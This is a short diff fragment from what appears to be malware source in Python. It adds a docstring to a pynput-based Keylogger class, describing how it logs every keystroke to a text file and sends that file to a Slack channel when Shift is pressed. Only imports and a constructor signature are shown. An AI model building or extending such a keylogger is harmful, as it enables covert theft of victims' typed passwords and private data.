@@ -2,7 +2,10 @@ from pynput.keyboard import Key, Listener
 from threading import Thread
 from file_handler import FileHandler
 
-
+"""
+The keylogger will be activated when the malware starts. It records all keystrokes to a txt file,
+and sends back the aforementioned txt file to the Slack channel when the 'Shift' key is pressed.
+"""
 class Keylogger(Thread):
 
     def __init__(self, config, file_handler: FileHandler, msg_client):
